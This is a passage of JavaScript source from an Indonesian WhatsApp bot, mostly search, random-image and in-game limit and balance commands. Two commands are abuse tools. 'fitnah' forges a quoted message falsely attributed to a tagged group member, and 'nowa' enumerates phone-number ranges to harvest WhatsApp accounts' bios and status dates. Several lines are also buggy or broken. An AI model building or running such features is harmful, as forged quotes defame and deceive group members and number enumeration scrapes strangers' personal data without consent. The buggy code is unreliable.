    let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan pesan silahkan diulang command tersebut" }, { quoted: m });
    await sleep(2000);

    const messages = ["*Limit Anda Berkurang 1*"];
    for (let i = 0; i < messages.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
      db.data.users[m.sender].limit -= 1;
      let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
      HuBotZ.sendMessage(m.chat, { text: `𝙻𝚒𝚖𝚒𝚝 𝙻𝚞 𝚂𝚒𝚜𝚊: ${limitUser}\n𝙼𝚎𝚗𝚐𝚒𝚛𝚒𝚖 𝚁𝚎𝚜𝚙𝚘𝚗...`, edit: key });
      if (i !== messages.length - 1) {
        await sleep(0);
      }
    }
    await sleep(0);

    const apiUrl = `https://aemt.me/pixiv?query=${encodeURIComponent(text)}`;
    const response = await fetch(apiUrl);
    const result = await response.json();
    const imagesInfo = result.result.map(data => ({
      title: data.title,
      author: data.author,
      uploadDate: moment(data.uploadDate).format('YYYY-MM-DD'),
      imageUrl: data.urls.regular
    }));

    const pesannya = imagesInfo.map(info => (
      `*Title:* ${info.title}\n` +
      `*Author:* ${info.author}\n` +
      `*Upload Date:* ${info.uploadDate}\n` +
      `*Image:* ${info.imageUrl}\n` +
      `*Note:* Jika Ingin Mengambil Gambarnya, Ketik ${prefix}get ${info.imageUrl}\n\n`
    ));

    HuBotZ.sendMessage(from, {
    image {
    url:
    },
    caption: `${pesannya}`,}
    { quoted: m })
  } catch (error) {
    console.error('Error fetching Pixiv API:', error);
    reply('Terjadi Error Saat Fetch Data Dari Pixiv, Coba Lagi Nanti. . .');
  }
}
break;*/
case 'pixivsearch':
case 'pixiv': {
  if (!isPremium && db.data.users[m.sender].limit < 3) return m.reply(`Kamu Tidak Punya Limit Sebanyak 3\nKarena Kamu Hanya Punya Limit Sebanyak : ${db.data.users[m.sender].limit}`);
  if (!text) return reply(`Gunakan dengan cara ${prefix + command} Raiden Shogun`);
  try {
    let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan pesan silahkan diulang command tersebut" }, { quoted: m });
    await sleep(2000);

    const messages = ["*Limit Anda Berkurang 3*"];
    for (let i = 0; i < messages.length; i++) {
      await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
      db.data.users[m.sender].limit -= 3;
      let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
      let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
      HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
      if (i !== messages.length - 1) {
        await sleep(0);
      }
    }
    await sleep(0);

    const apiUrl = `https://aemt.me/pixiv?query=${encodeURIComponent(text)}`;
    const response = await fetch(apiUrl);
    const result = await response.json();

    // Mengambil informasi acak dari hasil pencarian Pixiv
    let randomImageInfo = result.result[Math.floor(Math.random() * result.result.length)];
    let randomImage = randomImageInfo?.urls.regular;
    let randomID = randomImageInfo?.pid;
    let randomTitle = randomImageInfo?.title;
    let randomAuthor = randomImageInfo?.author;
    let randomR18 = randomImageInfo?.r18;
    let randomEXT = randomImageInfo?.ext;
    let randomUploadAt = moment(randomImageInfo?.uploadDate).format('YYYY-MM-DD')
    
    const pesannya = `*ID* : ${randomID}\n*Title* : ${randomTitle}\n*Author* : ${randomAuthor}\n*R18* ? ${randomR18}\n*Upload At* : ${randomUploadAt}\n*EXT* : ${randomEXT}\n*Image Url* : ${randomImage}`;
    
    //Mengambil Gambar Dari Deret Utama
/*    const imageinfo = result.result[0];
    const imageurl = imageinfo?.urls.regular;
    const imageid = imageinfo?.pid;
    const imagetitle = imageinfo?.title
    const imageauthor = imageinfo?.author
    const imager18 = imageinfo?.r18
    const imageext = imageinfo?.ext
    const imageUploadAt = moment(imageinfo?.uploadDate).format('YYYY-MM-DD')*/
/*
    const imagesInfo = result.result.map(data => ({
      id: data.uid,
      title: data.title,
      author: data.author,
      r18: data.r18,
      ext: data.ext,
      uploadDate: moment(data.uploadDate).format('YYYY-MM-DD'),
      imageUrl: data.urls.regular
    }));
    const pesannya = imagesInfo.map(info => (
      `*ID:* ${info.id}\n` +
      `*Title:* ${info.title}\n` +
      `*Author:* ${info.author}\n` +
      `*R18* ? ${info.r18}\n` +
      `*Upload Date:* ${info.uploadDate}\n` +
      `*Ext:* ${info.ext}\n` +
      `*Image Url:* ${info.imageUrl}\n`
    ));*/

//    const pesannya = `*ID* : ${imageid}\n*Title* : ${imagetitle}\n*Author* : ${imageauthor}\n*R18* ? ${imager18}\n*Upload At* : ${imageUploadAt}\n*EXT* : ${imageext}\n*Image Url* : ${imageurl}`;

      HuBotZ.sendMessage(m.chat, { image: { url: randomImage }, caption: `${pesannya}` }, { quoted: m });

  } catch (error) {
    console.error('Error fetching Pixiv API:', error);
    reply('Terjadi Error Saat Fetch Data Dari Pixiv, Coba Lagi Nanti. . .');
  }
}
break;
case 'pixivdl': {
  if (!isPremium && db.data.users[m.sender].limit < 2) return m.reply(`Kamu Tidak Punya Limit Sebanyak 2\nKarena Kamu Hanya Punya Limit Sebanyak : ${db.data.users[m.sender].limit}`);
  if (!text) return reply(`Gunakan dengan cara ${prefix + command} id ext\nExample: ${prefix + command} 10xxxxxxx .png`);
  let { key } = await HuBotZ.sendMessage(m.chat, { text: "Silahkan ditunggu, jika bot tidak mengirimkan pesan silahkan diulang command tersebut" }, { quoted: m });
  await sleep(2000);

  const messages = ["*Limit Anda Berkurang 2*"];
  for (let i = 0; i < messages.length; i++) {
    await HuBotZ.sendMessage(m.chat, { text: messages[i], edit: key });
    db.data.users[m.sender].limit -= 2;
    let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
    let limitUser = `${isPremium ? 'Infinity' : limitUserr}`
    HuBotZ.sendMessage(m.chat, { text: `🇺🇸 Your Remaining Limit: ${limitUser}\nSending Response. . .\n\n🇮🇩 Limit Anda Sisa: ${limitUser}\nMengirim Respon. . .`, edit: key });
    if (i !== messages.length - 1) {
      await sleep(0);
    }
  }
  await sleep(0);
  try {
    const [m1, m2] = args; // Splitting arguments directly
    // Mengambil URL gambar dari API
    const url = await fetch(`https://aemt.me/pixivdl?id=${m1}&ext=${m2}`);
    const buffer = await url.buffer();

    // Mengirim gambar
    await HuBotZ.sendMessage(m.chat, {
      image: buffer,
      caption: `${m1}`
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    m.reply('Terjadi kesalahan, Coba Lagi Nanti');
  }
}
break;
case 'yts': 
case 'ytsearch': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!text) m.reply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Cara membuat bot WhatsApp`)
let reso = await yts(`${text}`)
let aramat = reso.all
var tbuff = await getBuffer(aramat[0].image)
let teks = aramat.map(v => {
switch (v.type) {
case 'video': return `
📛 *Title :* *${v.title}* 
⏰ *Durasi :* ${v.timestamp}
🚀 *Diupload :* ${v.ago}
😎 *Views :* ${v.views}
🌀 *Url :* ${v.url}
`.trim()
case 'channel': return `
📛 *Channel* : ${v.name}
🌀 *Url :* ${v.url}
👻 *Subscriber :* ${v.subCountLabel} (${v.subCount})
🎦 *Total Video :* ${v.videoCount}
`.trim()
}
}).filter(v => v).join('\n----------------------------------------\n')

HuBotZ.sendMessage(m.chat, { image: tbuff, caption: teks }, { quoted: m })

 .catch((err) => {
replygcHuBotZ("Not found")
})
db.data.users[m.sender].limit -= 1
}
break
// Random Text
case 'fakta':
                    fetch('https://raw.githubusercontent.com/ArugaZ/grabbed-results/main/random/faktaunix.txt')
                        .then(res => res.text())
                        .then(body => {
                            let splitnix = body.split('\n')
                            let randomfakta = splitnix[Math.floor(Math.random() * splitnix.length)]
                            m.reply(`=> *Fakta:* ${randomfakta}`)
                        })
                        .catch(() => {
                            m.reply('Error Ngab🐦')
                        })
                    break
case 'motivasi':
        m.reply(`=> *Motivasi:* ${responmotivasi.data.result}\n`)
        break
case 'katabijak':
                    fetch('https://raw.githubusercontent.com/ArugaZ/grabbed-results/main/random/katabijax.txt')
                        .then(res => res.text())
                        .then(body => {
                            let splitbijak = body.split('\n')
                            let randombijak = splitbijak[Math.floor(Math.random() * splitbijak.length)]
                            m.reply(`=> *Kata Bijak:* ${randombijak}\n`)
                        })
                        .catch(() => {
                            m.reply('Ada yang Error!')
                        })
                        break
 // Random Menu
 case 'artinama': {
 if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!q) return reply(`Gini Ngab\nContoh : ${prefix+command} david`)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'⏳',
        key: m.key,
    }})
    try {
pepeklu = await artinama(`${q}`)
m.reply(`*Nama* : ${q}\n*Memiliki Arti* : ${pepeklu.message.arti}`)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'☑️',
        key: m.key,
    }})
} catch (e) {
console.log(e)
await HuBotZ.sendMessage(m.chat, {
    react: {
        text:'❌',
        key: m.key,
    }})
reply(`Arti Nama ${q} Tidak Di Temukan`)
}
}
break
case 'cecan':{
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
reply(mess.wait)
HuBotZ.sendMessage(m.chat, { caption: "Jangan Lupa Post Sw Biar Mantan Panas Coy🥵", image: { url: `https://api.zahwazein.xyz/randomasupan/cecan?apikey=${global.ZenzKey}` }}, { quoted: m })
.catch((e) => {
reply(mess.emror.feature)
})
}
db.data.users[m.sender].limit -= 1
break
case 'cosplay':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
newReply(mess.wait)
HuBotZ.sendMessage(m.chat, { caption: "Tuh Ngab😋", image: { url: `https://api.zahwazein.xyz/randomimage/cosplay?apikey=${global.ZenzKey}` }}, { quoted: m })
.catch((e) => {
newReply(mess.emror.feature)
})
db.data.users[m.sender].limit -= 1
}
break
case 'cogan':{
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
newReply(mess.wait)
addCountCmd('#cogan', m.sender, _cmd)
var query = ["cowo korea","cowo china", "cowo Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
HuBotZ.sendMessage(m.chat, { caption: "Random Cogan", image: { url: anu }}, { quoted: m })
.catch((e) => {
newReply(mess.emror.feature)

})
db.data.users[m.sender].limit -= 1
}
break
case 'waifu':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
reply(mess.wait)
addCountCmd('#waifu', m.sender, _cmd)
var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
HuBotZ.sendMessage(m.chat, { caption: "Random Waifu", image: { url: data }}, { quoted: m })
/*await sleep(1000)
await HuBotZ.sendPoll(m.chat, "Lanjut Cari Random Waifu?", ['nggak','waifu'])*/
.catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(mess.emror.feature)

})
db.data.users[m.sender].limit -= 1
}
break
/*case 'nggak' : {
m.reply('Oke')
}
break*/
// Balance Menu
case 'topglobal': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup)return newReply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPGLOBAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
for (let i = 0; i < total; i ++){
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
HuBotZ.sendTextWithMentions(m.chat, top, m)
//mentions(top, arrTop, true)
}
break
case 'toplocal': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup)return newReply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPLOCAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
let anggroup = groupMembers.map(a => a.id)
for (let i = 0; i < total; i ++){
if (anggroup.includes(balance[i].id)) {
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
}
HuBotZ.sendTextWithMentions(m.chat, top, m)
}
break

case 'starter':
case 'starters': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
 if (user.laststarterclaim) return m.reply(`kamu sudah melakukan klaim starter tools sebelumnya!`)
m.reply(`\t\t\t*Starter Supplies*\n\nSelamat *${pushaname}* Kamu Menggunakan Starter Pack Untuk Pemula. . .\n\nIni Hadiah Mu!\n\n> Wooden Pickaxe x1 Durability 50 Point\n> Wooden Axe x1 Durability 50 Point\n> Wooden Sword x1 Durability 50 Point`);
  user.woodpick += 1
  user.woodpickdurability += 60
  user.woodaxe += 1
  user.woodaxedurability += 60
  user.woodsword += 1
  user.woodsworddurability += 60
user.laststarterclaim = true
}
break
case 'claimlimit': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
let timeout = 86400000
if (new Date - user.lastclaimlimit < timeout) return m.reply(`Kamu sudah melakukan klaim limit dalam 24 jam terakhir. Kamu bisa klaim lagi dalam *${msToTime(time - new Date())}*`)
m.reply(`+20 Daily Limit`)
addCountCmd('#claimlimit', m.sender, _cmd);
user.limit += 20
user.lastclaimlimit = new Date * 1
}
break
case 'claim':
case 'daily': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
const timeout = 86400000
const limitnya = ['2','4','1','5','9','3','8','7','6','10','11']
const randomny = limitnya[Math.floor(Math.random() * limitnya.length)]
let time = user.lastclaim + timeout
 if (new Date - user.lastclaim < timeout) return m.reply(`Kamu sudah melakukan klaim dalam 24 jam terakhir. Kamu bisa klaim lagi dalam *${msToTime(time - new Date())}*`)
m.reply(`========== _DAILY REWARD_ ==========\n\nSelamat *${pushname}* Kamu Mendapatkan\n*Balance :* 4999\n*Limit :* ${randomny}\n*Potion :* 2`);
addCountCmd('#daily', m.sender, _cmd);
  user.money += 4999
  user.potion += 2
  user.limit += randomny
user.lastclaim = new Date * 1;
}
break
case 'weekly':
case 'mingguan': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
const timeout = 604800000
let time = user.lastweekly + timeout
 if (new Date - user.lastweekly < timeout) return m.reply(`Kamu sudah melakukan klaim mingguan. Kamu bisa klaim mingguan lagi dalam *${clockString(time - new Date())}*`)
m.reply(`========== _WEEKLY REWARD_ ==========\n\nSelamat *${pushname}* Kamu Mendapatkan\n*Balance :* 35000\n*Limit :* 15\n*Potion :* 10\n*XP :* 999`);
addCountCmd('#weekly', m.sender, _cmd);
  user.money += 35000
  user.potion += 10
  user.limit += 15
  user.exp += 999
user.lastweekly = new Date * 1;
}
break
case 'monthly':
case 'bulanan': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
const timeout = 2592000000
let time = user.lastmonthly + timeout
 if (new Date - user.lastmonthly < timeout) return m.reply(`Kamu sudah melakukan klaim bulanan. Kamu bisa klaim bulanan lagi dalam *${clockString(time - new Date())}*`)
m.reply(`========== _WEEKLY REWARD_ ==========\n\nSelamat *${pushname}* Kamu Mendapatkan\n*Balance :* 50000\n*Limit :* 30\n*Potion :* 15\n*XP :* 4999`);
addCountCmd('#monthly', m.sender, _cmd);
  user.money += 50000
  user.potion += 15
  user.limit += 30
  user.exp += 4999
user.lastmonthly = new Date * 1;
}
break
case 'cd':
case 'cooldown': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
    let str = `
*—「 🕖 Cooldown 」—*
*Last Memancing :* ${user.lastfishing > 0 ? '❌' : '✅'}
*Last Adventure :* ${user.lastadventure > 0 ? '❌' : '✅'}
*Last Meroket :* ${user.lastmeroket > 0 ? '❌' : '✅'}
*Last Luckytime :* ${user.lastluck > 0 ? '❌' : '✅'}
*Last Mining :* ${user.lastmining > 0 ? '❌' : '✅'}
*Last Claim :* ${user.lastclaim > 0 ? '❌' : '✅'}
*Last Weekly :* ${user.lastweekly > 0 ? '❌' : '✅'}
*Last Monthly :* ${user.lastmonthly > 0 ? '❌' : '✅'}
\n${readMore}
`
reply(str)
}
break
case 'cekrole':
case 'levelrole':
case 'role': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
let user = db.data.users[m.sender]
let textrolenya = `Role Kamu Saat Ini Adalah : ${user.role}`
reply(textrolenya)
}
break
case 'levelup':
case 'uplevel': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
const { canLevelUp, xpRange } = require("./lib/levelling");
const knights = require("knights-canvas");
    let user = db.data.users[m.sender]
    if (!canLevelUp(user.level, user.exp, global.multiplier)) {
        let {
            min,
            xp,
            max
        } = xpRange(user.level, global.multiplier)
        m.reply(`
Level ${user.level} 📊
*${user.exp - min} / ${xp}*
Kurang *${max - user.exp}* lagi! ✨
`)
    }
    let before = user.level * 1
    while (canLevelUp(user.level, user.exp, global.multiplier)) user.level++
    if (before !== user.level) {
        let teks = `Selamat ${pushname} naik 🧬level\n.             ${user.role}`
        let str = `Selamat ${pushname} naik 🧬level\n.             ${user.role}

*🎉 C O N G R A T S 🎉*
*${before}* ➔ *${user.level}* [ *${user.role}* ]

• 🧬Level Sebelumnya : ${before}
• 🧬Level Baru : ${user.level}
• Pada Jam : ${new Date().toLocaleString("id-ID")}

*Note:* _Semakin sering berinteraksi dengan bot Semakin Tinggi level kamu_
`
addCountCmd('#levelup', m.sender, _cmd);

        let {
            min,
            xp,
            max
        } = xpRange(user.level, global.multiplier)
        
        let exp = user.exp
        let rq = xp
        let role = user.role
        let level = user.level
        let disec = m.sender.substring(3, 7)
        let sortedlevel = Object.entries(db.data.users).sort((a, b) => b[1].level - a[1].level)
        let userslevel = sortedlevel.map(v => v[0])
        let rank = (userslevel.indexOf(m.sender) + 1)

        let ppuser
        try {
            ppuser = await HuBotZ.profilePictureUrl(m.sender, "image")
        } catch {
            ppuser = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMxMUXFtd5GrFkxyrU-f5zA2IH8MZ-U-cFKg&usqp=CAU"
        }
//        let apiUrl = await fetch(`https://api.akuari.my.id/canvas/rank?avatar=${ppuser}&username=${pushname}&needxp=${rq}&bg=https://e1${global.flaming}&level=${level}&currxp=${exp}&rank=https://i.ibb.co/Wn9cvnv/FABLED.png`);
        let renk = await await new knights.Rank()
                    .setAvatar(ppuser)
                    .setUsername(pushname)
                    .setBg(global.flaming)
                    .setNeedxp(rq)
                    .setCurrxp(exp)
                    .setRank("https://i.ibb.co/Wn9cvnv/FABLED.png")
                    .toAttachment();
        try {
            await HuBotZ.sendMessage(m.chat, {
                image: renk.toBuffer(),
                caption: str
                }, { quoted: m });
        } catch (e) {
        try {
            await HuBotZ.sendMessage(m.chat, {
                image: renk.toBuffer(),
                caption: str
                }, { quoted: m });
            } catch (e) {
            await HuBotZ.sendFile(m.chat, "levelup", "", str, m)
            }
        }

    }
}
break
case 'addlimit': {
let user = db.data.users[m.sender];
  if (!isCreator) return reply(mess.OnlyOwner);
  if (!text) return reply(`Format Salah!, Contoh ${prefix + command} *@Tag JumlahNya*`);
  let users = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
  if (!users) return reply(`Tag orang yang ingin ditambahkan limitnya`);
  let amount = parseInt(args[1]);
  if (!amount || isNaN(amount)) return reply(`Masukkan jumlah yang valid!`);
  let puki = Number(parseInt(text) * 0)
  addCountCmd('#addlimit', m.sender, _cmd);
  db.data.users[users].limit += amount
  reply(`Berhasil Menambahkan Limit Sebanyak ${amount}\n\nSisa Limit : ${user.limit}/${global.limitawal.premium}`);
}
break;
case 'buylimit': {
let user = db.data.users[m.sender]
if (isPremium) return m.reply(`User Premium Tidak Membutuhkan Limit!!!`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = $1000 balance`)
if (text.includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(text)) return newReply(`Harus berupa angka`)
if (args[0] === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 1000)
if (user.money <= ane) return newReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buylimit', m.sender, _cmd)
user.money -= ane
user.limit += parseInt(text)
newReply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Balance : $${user.money}\nSisa Limit : ${user.limit}/${global.limitawal.free}`)
}
break
case 'buygamelimit': 
case 'buyglimit': {
let user = db.data.users[m.sender]
if (isPremium) return m.reply(`User Premium Tidak Membutuhkan Limit!!!`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *jumlah game limit yang ingin dibeli*\n\nHarga 1 game limit = $500 balance\nPajak $1 / $10`)
if (text.includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(text)) return newReply(`Harus berupa angka`)
if (text === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 500)
if (user.money <= ane) return newReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buygamelimit', m.sender, _cmd)
user.money -= ane
user.glimit += parseInt(text)
newReply(`Pembeliaan game limit sebanyak ${text} berhasil\n\nSisa Balance : $${user.balance}\nSisa Game Limit : ${user.glimit}/${global.limitgameawal.free}`)
}
break
case 'transfer':
case 'tf': {
  if (!text) return reply(`Gunakan dengan cara ${prefix + command} *@tag nominal*\n\nContoh : ${prefix + command} @6285600793871 2000`);
  
  let users = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
  if (!users) return reply(`Tag orang yang ingin ditransfer balance`);
  
  if (!args[1]) return reply(`Masukkan nominalnya!`);
  if (isNaN(args[1])) return reply(`Nominal harus berupa angka!`);
  if (args[1] === 'infinity') return reply(`Yahaha saya tidak bisa ditipu`);
  if (args[1].includes("-")) return reply(`Jangan menggunakan -`);

  const userBalance = db.data.user[m.sender].money;

  if (userBalance <= args[1] || userBalance === 'undefined') {
    return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`);
  }

  addCountCmd('#transfer', m.sender, _cmd);
  db.data.users[m.sender].money -= parseInt(args[1]);
  db.data.users[users].money += parseInt(args[1]);

  HuBotZ.sendTextWithMentions(m.chat, `Sukses transfer balance sebesar ${args[1]} kepada @${users.split("@")[0]}`, m);
}
break;
case 'alllimit':
case 'alllimituser':
case 'limituser':
case 'userlimit': {
    if (!isCreator && !isMods) return reply(mess.OnlyOwner)
    let users = Object.keys(db.data.users)
    let txt = `「 *ALL LIMIT USER* 」\n\n`
    for (let userID of users) {
        let limitnya = db.data.users[userID].limit
        let limitUsernya = isPremium ? global.limitawal.premium : `${limitnya}`
        txt += `> *ID :* @${userID.split("@")[0]}\n> *Limit* : ${limitUsernya}\n\n`
    }
    HuBotZ.sendTextWithMentions(m.chat, txt, m)
    }
    break;
case 'ceklimit':
case 'limitcek': {
let who
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
else who = m.sender
let ke1 = db.data.users[who].limit
let ke2 = db.data.users[who].exp
let ke3 = db.data.users[who].money
    
    let caption = `
----- *I N F O  U S E R* -----
> 📄 *Name* @${who.split("@")[0]}
> 🌌 *Limit:* ${ke1}
> ✉️ *Exp:* ${ke2}
> 💹 *Money:* Rp.${ke3}
`
  HuBotZ.sendTextWithMentions(m.chat, caption, m)
}
break
case 'limit': 
case 'balance': 
case 'ceklimit': 
case 'cekbalance':{
let limitUserr = `${db.data.users[m.sender].limit}/${global.limitawal.free}`
let gamelimit = `${isPremium ? global.limitgameawal.premium : global.limitgameawal.free}`
let user = db.data.users[m.sender]
let teksnya = `
╭──────━•
│ *🌌 Limit :* ${isPremium ? 'Unlimited' : limitUserr}
│ *🕹️ Limit Game :* ${gamelimit}
│ *💹 Balance :* Rp.${db.data.users[m.sender].money}
│ *🏆 Role :* ${user.role}
│ *✉️ Exp :* ${db.data.users[m.sender].exp}
╰──────────━⃝┅⃝━━────────┄
${readMore}
╭──────━•
│ Kamu dapat membeli limit dengan cara : 
│ ${prefix}buylimit *jumlah*
│ ${prefix}buyglimit *jumlah*
│ *Note :* 
│\t\tHarga 1 limit = Rp.1000
│\t\tDan 1 glimit = Rp.500
╰──────────━⃝┅⃝━━────────┄`
reply(teksnya)
}
break
// Baileys
case 'fitnah':
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text) return HuBotZ.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix+command} *@tag|pesantarget|pesanbot*\n\n_Contoh_\n\n${prefix+command} @${m.sender.split("@")[0]}|enak ga semalem|enak banget`, m)
var org = text.split("|")[0]
var target = text.split("|")[1];
var bot = text.split("|")[2];
if (!org.startsWith('@')) return newReply('Tag orangnya')
if (!target) return newReply(`Masukkan pesan target!`)
if (!bot) return newReply(`Masukkan pesan bot!`)
var mens = parseMention(target)
addCountCmd('#fitnah', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${target}` }}
HuBotZ.sendMessage(m.chat, { text: bot, mentions: mens }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case'nowa':
if (!isPremium) return newReply(mess.OnlyPrem)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *nomor*\n\n_Contoh_\n\n${prefix+command} 628XXXXXXXXXX`)
if (!text.includes('x')) return newReply('Misal 6285xxx')
newReply(mess.wait)
addCountCmd('#nowa', m.sender, _cmd)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = teks.split('x')[0]
var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
var random_length = countInstances(teks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}

var nomerny = `List Nomer\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`

for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]

var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}

var anu = await HuBotZ.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false

try {
try {
var anu1 = await HuBotZ.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
} else {
if (random_length == 6) {
var thn = `${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}`
if (thn.endsWith('2009')) {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBio Name : ${anu1.status}\nTahun : ${moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')}\n\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
}
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
}
}
newReply(`${nomerny}${no_bio}${no_watsap}`)
break
case 'q': case 'quoted': {
if (!m.quoted) return newReply('Reply Pesannya!!')
let gwm = await HuBotZ.serializeM(await m.getQuotedObj())
if (!gwm.quoted) return newReply('Pesan Yang anda reply tidak mengandung reply')
await gwm.quoted.copyNForward(m.chat, true)
}
break
case 'fakehidetag':
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.isGroup) return newReply(mess.OnlyGrup)
